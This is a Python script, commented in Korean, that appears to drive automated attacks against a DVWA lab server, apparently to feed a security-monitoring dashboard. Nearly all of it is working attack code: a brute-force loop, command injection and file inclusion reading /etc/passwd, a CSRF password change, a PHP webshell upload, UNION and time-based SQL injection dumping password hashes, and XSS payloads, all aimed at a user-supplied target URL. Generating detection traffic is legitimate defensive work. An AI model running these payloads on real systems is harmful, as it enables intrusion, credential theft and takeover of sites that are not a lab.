import requests
import time
import sys
import re
import itertools
import string

# ==========================================
# 전역 설정
# ==========================================
HEADERS = {"User-Agent": "AI-SOC-Tester-Real"}
session = requests.Session()
BASE_URL = ""

# ==========================================
# 자동 로그인 및 세션 획득 (CSRF 우회)
# ==========================================
def auto_login(ip):
    global BASE_URL
    if not ip.startswith("http"):
        BASE_URL = f"http://{ip}"
    else:
        BASE_URL = ip
    
    login_url = f"{BASE_URL}/login.php"
    
    print(f"\n[*] {BASE_URL} DVWA 서버로 자동 로그인을 시도합니다...")
    try:
        res_get = session.get(login_url, headers=HEADERS, timeout=5)
        token_match = re.search(r"name=['\"]user_token['\"] value=['\"]([a-f0-9]+)['\"]", res_get.text)
        
        user_token = token_match.group(1) if token_match else ""
            
        login_data = {
            "username": "admin",
            "password": "password",
            "Login": "Login",
            "user_token": user_token
        }
        
        res_post = session.post(login_url, data=login_data, headers=HEADERS, timeout=5)
        
        if "Welcome to Damn Vulnerable Web Application" in res_post.text or res_post.status_code == 200:
            print("[+] 로그인 성공! 세션 획득 완료.")
            session.cookies.set("security", "low")
            return True
        else:
            print("[-] 로그인 실패. 아이디/패스워드 또는 URL을 확인하세요.")
            return False
            
    except requests.exceptions.RequestException as e:
        print(f"[-] 서버 통신 실패: {e}")
        return False

# ==========================================
# 1~10번 개별 실전 취약점 공격 및 검증 함수
# ==========================================

def attack_1_real_brute_force():
    """
    Brute Force: 앞 4자리는 고정하고 뒤 4자리만 전수 조사하는 방식.
    테스트 속도를 높이면서도 '정석적인 대입 과정'을 보여주기 위해 수정되었습니다.
    """
    print("\n[1] 정석 Brute Force (뒤 4자리 타겟팅) 시도 중...")
    url = f"{BASE_URL}/vulnerabilities/brute/"
    
    prefix = "pass" # 앞 4자리 고정
    charset = string.ascii_lowercase + string.digits
    
    print(f"[*] 접두사 '{prefix}'를 고정하고 나머지 4자리 조합을 대입합니다.")
    
    # 4자리 조합 전수 조사
    for guess_tuple in itertools.product(charset, repeat=4):
        guess_pw = prefix + ''.join(guess_tuple)
        params = {"username": "admin", "password": guess_pw, "Login": "Login"}
        try:
            res = session.get(url, params=params, headers=HEADERS)
            # 성공 검증
            if "Welcome to the password protected area" in res.text:
                print(f"  🎉 [해킹 성공] 무차별 대입 성공! 비밀번호 탈취: {guess_pw}")
                return True
        except Exception:
            pass
    
    print("  [-] 실패: 일치하는 패스워드를 찾지 못했습니다.")
    return False

def attack_2_command_injection():
    print("\n[2] 정석 Command Injection 시도 중...")
    url = f"{BASE_URL}/vulnerabilities/exec/"
    data = {"ip": "127.0.0.1 && cat /etc/passwd", "Submit": "Submit"}
    try:
        res = session.post(url, data=data, headers=HEADERS)
        if "root:x:0:0:" in res.text:
            print("  🎉 [해킹 성공] OS 명령어 실행 성공!")
            # 유출된 데이터의 샘플(root 계정 정보) 추출 및 출력
            leaked = re.search(r"root:x:0:0:.*", res.text)
            if leaked:
                print(f"  [🔓 유출 데이터 샘플]: {leaked.group(0)}")
            return True
    except Exception as e: print(f"  [-] 에러: {e}")
    return False

def attack_3_csrf():
    print("\n[3] 정석 CSRF 시도 중...")
    url = f"{BASE_URL}/vulnerabilities/csrf/"
    new_pw = "hacked123"
    params = {"password_new": new_pw, "password_conf": new_pw, "Change": "Change"}
    try:
        res = session.get(url, params=params, headers=HEADERS)
        if "Password Changed." in res.text:
            print(f"  🎉 [해킹 성공] CSRF 성공! 관리자 비밀번호가 '{new_pw}'로 변경되었습니다.")
            return True
    except Exception as e: print(f"  [-] 에러: {e}")
    return False

def attack_4_file_inclusion():
    print("\n[4] 정석 File Inclusion (LFI) 시도 중...")
    url = f"{BASE_URL}/vulnerabilities/fi/"
    params = {"page": "/etc/passwd"}
    try:
        res = session.get(url, params=params, headers=HEADERS)
        if "root:x:0:0:" in res.text:
            print("  🎉 [해킹 성공] LFI 취약점 확인!")
            leaked = re.search(r"root:x:0:0:.*", res.text)
            if leaked:
                print(f"  [🔓 유출 데이터]: {leaked.group(0)}")
            return True
    except Exception as e: print(f"  [-] 에러: {e}")
    return False

def attack_5_file_upload():
    print("\n[5] 정석 File Upload 시도 중...")
    url = f"{BASE_URL}/vulnerabilities/upload/"
    webshell_code = '<?php system($_GET["cmd"]); ?>'
    files = {'uploaded': ('poc.php', webshell_code, 'application/x-php')}
    data = {"Upload": "Upload"}
    try:
        res = session.post(url, files=files, data=data, headers=HEADERS)
        if "successfully uploaded!" in res.text:
            print("  🎉 [해킹 성공] 웹쉘(poc.php) 업로드 성공!")
            return True
    except Exception as e: print(f"  [-] 에러: {e}")
    return False

def attack_6_sql_injection():
    print("\n[6] 정석 SQL Injection 시도 중...")
    url = f"{BASE_URL}/vulnerabilities/sqli/"
    payload = "1' UNION SELECT user, password FROM users #"
    params = {"id": payload, "Submit": "Submit"}
    try:
        res = session.get(url, params=params, headers=HEADERS)
        # 사용자명과 해시 추출
        users = re.findall(r"First name: ([a-zA-Z0-9_]+)", res.text)
        hashes = re.findall(r"Surname: ([a-f0-9]{32})", res.text)
        if hashes:
            print("  🎉 [해킹 성공] SQLi 성공! DB 사용자 정보 탈취 완료.")
            for u, h in zip(users, hashes):
                print(f"  [🔓 유출 데이터] ID: {u.ljust(10)} | MD5 해시: {h}")
            return True
    except Exception as e: print(f"  [-] 에러: {e}")
    return False

def attack_7_sql_injection_blind():
    print("\n[7] 정석 SQL Injection Blind 시도 중...")
    url = f"{BASE_URL}/vulnerabilities/sqli_blind/"
    payload = "1' AND (SELECT 1 FROM (SELECT(SLEEP(3)))a) #"
    params = {"id": payload, "Submit": "Submit"}
    try:
        start_time = time.time()
        session.get(url, params=params, headers=HEADERS)
        elapsed_time = time.time() - start_time
        if elapsed_time >= 3:
            print(f"  🎉 [해킹 성공] Blind SQLi 확인! (응답 지연 {elapsed_time:.2f}초)")
            return True
    except Exception as e: print(f"  [-] 에러: {e}")
    return False

def attack_8_xss_reflected():
    print("\n[8] 정석 XSS Reflected 시도 중...")
    url = f"{BASE_URL}/vulnerabilities/xss_r/"
    payload = "<script>console.log('XSS_POC')</script>"
    params = {"name": payload}
    try:
        res = session.get(url, params=params, headers=HEADERS)
        if payload in res.text:
            print("  🎉 [해킹 성공] Reflected XSS 확인!")
            return True
    except Exception as e: print(f"  [-] 에러: {e}")
    return False

def attack_9_xss_stored():
    print("\n[9] 정석 XSS Stored 시도 중...")
    url = f"{BASE_URL}/vulnerabilities/xss_s/"
    payload = "<script>console.log('STORED_XSS_POC')</script>"
    data = {"txtName": "Hacker", "mtxMessage": payload, "btnSign": "Sign+Guestbook"}
    try:
        session.post(url, data=data, headers=HEADERS)
        res = session.get(url, headers=HEADERS)
        if payload in res.text:
            print("  🎉 [해킹 성공] Stored XSS 확인!")
            return True
    except Exception as e: print(f"  [-] 에러: {e}")
    return False

def attack_10_xss_dom():
    print("\n[10] 정석 XSS DOM 시도 중...")
    url = f"{BASE_URL}/vulnerabilities/xss_d/"
    payload = "<script>console.log('DOM_XSS_POC')</script>"
    params = {"default": f"English{payload}"}
    try:
        res = session.get(url, params=params, headers=HEADERS)
        if payload in res.text:
            print("  🎉 [해킹 성공] DOM XSS 확인!")
            return True
    except Exception as e: print(f"  [-] 에러: {e}")
    return False

# ==========================================
# 실행 제어부
# ==========================================
if __name__ == "__main__":
    print("🚀 SOC 대시보드 검증용 실전 Exploit 자동화 봇 (최적화 버전) 🚀\n")
    target_ip = input("타겟 서버(DVWA)의 IP 또는 URL을 입력하세요: ")
    
    if not auto_login(target_ip):
        sys.exit()
        
    print("--------------------------------------------------")
    print("정석 모의해킹 공격을 시작합니다 (Security: LOW)...\n")
    
    attacks = {
        "Brute Force": attack_1_real_brute_force,
        "Command Injection": attack_2_command_injection,
        "CSRF": attack_3_csrf,
        "LFI": attack_4_file_inclusion,
        "File Upload": attack_5_file_upload,
        "SQLi (UNION)": attack_6_sql_injection,
        "SQLi Blind": attack_7_sql_injection_blind,
        "XSS Reflected": attack_8_xss_reflected,
        "XSS Stored": attack_9_xss_stored,
        "XSS DOM": attack_10_xss_dom
    }
    
    results = {}
    for name, attack_func in attacks.items():
        results[name] = attack_func()
    
    print("\n==================================================")
    print("📊 최종 모의해킹 공격 결과 요약")
    for attack, success in results.items():
        status = "✅ 탈취 성공" if success else "❌ 실패"
        print(f" - {attack.ljust(20)}: {status}")
    print("==================================================")
